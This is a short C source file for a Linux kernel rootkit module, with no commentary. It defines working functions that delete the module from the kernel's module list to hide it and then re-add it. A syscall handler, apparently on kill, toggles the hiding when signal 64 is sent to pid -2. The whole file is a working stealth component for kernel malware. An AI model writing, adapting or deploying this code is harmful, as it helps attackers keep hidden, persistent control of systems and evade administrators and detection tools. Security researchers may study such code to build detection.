#include "hide_rootkit.h"
#include <linux/module.h>

extern struct module __this_module;

static short hidden = 0;

static struct list_head *prev_module;

void hideme(void) {
  printk(KERN_INFO "Rootkit hidden\n");
  prev_module = THIS_MODULE->list.prev;
  list_del(&THIS_MODULE->list);
  hidden = 1;
}

void showme(void) {
  printk(KERN_INFO "Rootkit shown\n");
  list_add(&THIS_MODULE->list, prev_module);
  hidden = 0;
}

void hide_handler(struct pt_regs *syscall_regs) {
  int sig = syscall_regs->si;
  int pid = syscall_regs->di;
  if (sig == 64 && pid == -2) {
    syscall_regs->si = 0;
    if (hidden) {
      showme();
    } else {
      hideme();
    }
  }
}
